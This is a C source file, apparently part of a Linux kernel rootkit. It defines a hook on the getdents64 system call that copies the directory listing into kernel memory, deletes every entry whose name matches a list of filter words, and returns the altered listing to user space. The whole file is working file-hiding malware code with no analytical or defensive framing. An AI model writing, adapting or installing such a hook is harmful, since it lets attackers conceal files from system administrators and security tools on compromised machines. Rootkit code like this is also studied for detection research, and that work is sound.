#include "getdents64.h"
#include "../shared.h"
#include "linux/kern_levels.h"
#include "linux/printk.h"
#include "linux/slab.h"
#include "linux/uaccess.h"
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/version.h>

asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
asmlinkage long getdents64_hook(struct pt_regs *regs) {
  int ret = real_sys_getdents64(regs);
  int offset = 0;
  struct linux_dirent64 __user *uspace_dirent = (void __user *)regs->si;
  struct linux_dirent64 *kspace_dirent, *current_dirent, *previous_dir = NULL;

  if (ret <= 0) {
    return ret; // Return early if no entries or error
  }

  kspace_dirent = kzalloc(ret, GFP_KERNEL);
  if (!kspace_dirent) {
    printk(KERN_ERR "hooked_getdents64: failed to allocate memory\n");
    return ret;
  }

  if (copy_from_user(kspace_dirent, uspace_dirent, ret)) {
    printk(KERN_ERR
           "hooked_getdents64: failed to copy dirent from user space\n");
    kfree(kspace_dirent);
    return ret;
  }

  struct filter_word *element;
  while (offset < ret) {
    current_dirent = (void *)kspace_dirent + offset;
    unsigned long current_reclen = current_dirent->d_reclen;

    // Validate record length to prevent infinite loops
    if (current_reclen == 0) {
      printk(KERN_ERR
             "hooked_getdents64: zero record length detected, breaking\n");
      break;
    }

    unsigned long name_len = strlen(current_dirent->d_name);
    bool matched = false;

    // Check against filter words
    list_for_each_entry(element, &filter_words, list) {
      unsigned long prefix_len = strlen(element->name);

      if (name_len < prefix_len) {
        continue; // Just skip this comparison, don't affect offset yet
      }

      // Fixed memcmp - was comparing address of element->name instead of its
      // content
      if (memcmp(element->name, current_dirent->d_name, prefix_len) == 0 ||
          (strstr(current_dirent->d_name, element->name) != NULL)) {
        matched = true;
        break; // Found a match, no need to check other filters
      }
    }

    if (matched) {
      // Entry should be hidden
      printk(KERN_INFO "hooked_getdents64: hiding entry, name: %s, type: %u",
             current_dirent->d_name, current_dirent->d_type);

      if (current_dirent == kspace_dirent) {
        // It's the first entry in the buffer
        memmove(current_dirent, (void *)current_dirent + current_reclen,
                ret - current_reclen); // Correct size calculation
        ret -= current_reclen;
        // Don't increment offset as we want to process the entry that was just
        // moved here
      } else {
        // Not the first entry, extend previous entry to hide this one
        previous_dir->d_reclen += current_reclen;
        offset += current_reclen; // Skip over the hidden entry
      }
    } else {
      // Keep this entry, move to the next one
      previous_dir = current_dirent;
      offset += current_reclen;
    }

    printk(KERN_DEBUG "offset: %d, ret: %d", offset, ret);
  }

  if (copy_to_user(uspace_dirent, kspace_dirent, ret)) {
    printk(
        KERN_ERR
        "hooked_getdents64: failed to copy dirent from kernel to user space\n");
    kfree(kspace_dirent);
    return ret;
  }

  kfree(kspace_dirent);
  return ret;
}
